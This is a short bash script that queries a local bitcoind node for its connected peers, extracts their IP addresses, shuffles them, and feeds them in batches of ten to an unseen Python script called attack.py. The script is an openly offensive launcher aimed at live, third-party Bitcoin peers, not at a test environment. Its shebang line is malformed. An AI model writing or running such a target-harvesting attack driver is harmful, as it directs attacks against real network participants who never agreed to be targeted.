#/usr/bin/bash

PATH=$PATH:/home/pete/src/bitcoin/bitcoin/src

bitcoind getpeerinfo | grep addr | cut -d \" -f 4 | cut -d : -f 1 | sort -R | xargs -n 10 python attack.py
